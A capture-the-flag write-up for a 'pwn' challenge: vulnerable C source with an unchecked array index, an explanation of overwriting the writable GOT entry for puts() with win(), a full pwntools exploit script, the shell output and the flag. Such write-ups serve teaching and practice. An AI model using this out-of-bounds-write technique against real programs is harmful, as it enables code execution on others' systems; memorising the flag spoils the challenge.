# [PWN] arrays

## Vulnerability

- No bound checking on array index

## Source

```c
int main(void) {
  init();
  char choice;
  puts("WELCOME TO DJS MARKSHEET CALCULATOR.");
  puts("ENTER YOUR MARKS AND I SHALL TELL YOU YOUR PERCENTAGE.");
  for (int i = 0; i < N; i++) {
    printf("Marks in Subject_%d: ", i + 1);
    scanf("%ld", &MARKS[i]);
  }
  puts("Please check the given data:");
  print_marks();
  printf("Do you want to modify any field [y/n] ");
  while (choice != 'y' && choice != 'n') {
    choice = getchar();
  }
  if (choice == 'y') {
    int index;
    uint64_t marks;
    printf("Which subject to edit (1-5) : ");
    scanf("%d", &index);
    index -= 1; // Zero index it
    printf("Marks : ");
    scanf("%ld", &marks);
    MARKS[index] = marks;
    puts("Ok modified. Check it now");
  }
  print_marks();
  double sum = 0;
  for (int i = 0; i < N; i++) {
    sum += MARKS[i];
  }
  printf("Your percentage would be : %.02f\n", sum / N);
  return EXIT_SUCCESS;
}

```

## Exploit

Since there is no bound checking on `index` we can use this to pivot around the memory and write arbitrary data to any desired location.



This binary is compiled with `partial relro` which means the GOT (Global Offset Table) table is in a writable section of memory. If you know how the ELF structure is, you know that the GOT table is very close to global variables we declare. Since `MARKS` is a global variable, it is situated very close to the GOT.

```c
    MARKS[index] = marks;
    puts("Ok modified. Check it now");
```

The function called just after assigning the value, is `puts()`. So if we overwrite the GOT entry of `puts()` with memory address of `win()`. Then the control flow would be redirected there and we would get a shell.

```python
from pwn import *

exe = ELF("./arrays")

context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe

gs = '''
b * main+361
c
'''

# io = process(exe.path)
io = remote('localhost', 50001)
# gdb.attach(io, gdbscript=gs)
for _ in range(5):
    io.sendline(b'0')

io.sendline(b'y')
io.sendline(b'-19')
io.sendline(str(exe.sym.win).encode())
io.clean()

io.interactive()

```

```shell
➜  solution python solve.py
[*] Switching to interactive mode
$ ls
arrays  flag.txt
$ cat flag.txt
DJSISACA{n3X7_71m3_1_W1ll_1ncLUD3_80Und_cH3Ck1N9}
```

## Flag

`DJSISACA{n3X7_71m3_1_W1ll_1ncLUD3_80Und_cH3Ck1N9}`
